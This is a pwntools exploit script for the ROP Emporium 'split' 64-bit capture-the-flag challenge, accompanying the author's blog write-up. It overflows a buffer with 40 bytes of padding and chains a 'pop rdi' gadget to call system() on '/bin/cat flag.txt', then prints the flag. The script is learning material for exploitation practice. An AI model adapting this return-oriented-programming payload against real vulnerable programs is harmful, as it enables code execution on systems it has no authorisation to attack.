#Author:    Christoffer.Claesson@Securitybits.io
#Blog:      https://blog.securitybits.io/2019/08/10/ropemporium-1-split-64-bit/

#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('split')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}

continue
'''.format(**locals())

#0x00601060                 /bin/cat flag.txt
#0x00400420                 system()
#0x00400883                 pop rdi; ret
# -- Exploit goes here --
junk    = 'A'*40           #Controlling RIP Register
usefulString = p64(exe.symbols.usefulString) #/bin/cat flag.txt
system  = p64(exe.symbols.system)    #Creating the system call
pop_rdi = p64(0x00400883)           #Putting the string onto RDI

payload = ""
payload += junk
payload += pop_rdi
payload += usefulString
payload += system

io = start()
io.recvuntil('> ')
io.sendline(payload)
log.success('Flag: ' + io.recv(512))
